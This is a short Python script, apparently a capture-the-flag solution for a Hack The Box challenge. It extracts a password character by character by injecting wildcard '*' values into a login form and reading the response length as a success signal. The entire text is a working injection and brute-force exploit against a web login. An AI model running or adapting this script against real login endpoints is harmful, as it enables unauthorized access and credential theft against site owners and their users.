#For passwords or fields that accept regex its possible to brute force using wildcard *
import requests
import string

url = "http://178.62.5.61:32468/login"
#known start
leaked = ['H','T','B','{']

printable = string.printable.replace('*', '')

#loop until known end }
while leaked[-1] != '}':
    print(''.join(leaked))
    for char in printable:    
        r = requests.post(url, {"username":'*', "password": ''.join(leaked) + char + '*'})
        if r.headers['Content-Length'] == '2586': #length of paged returned on success
            leaked.append(char)
            break

print('Final password: ' + ''.join(leaked))